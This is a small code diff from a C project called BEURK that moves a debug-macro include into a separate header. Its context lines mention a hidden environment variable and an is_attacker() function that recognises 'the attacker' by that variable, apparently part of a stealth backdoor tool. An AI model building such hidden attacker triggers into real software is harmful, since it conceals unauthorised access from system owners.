@@ -18,8 +18,9 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include "beurk.h" /* DEBUG(), prototype */
+#include "beurk.h" /* prototype */
 #include "config.h" /* HIDDEN_ENV_VAR */
+#include "debug.h" /* DEBUG() */
 
 /** is_attacker() checks if the process is called by the attacker,
  * using a special environment variable that is defined in our
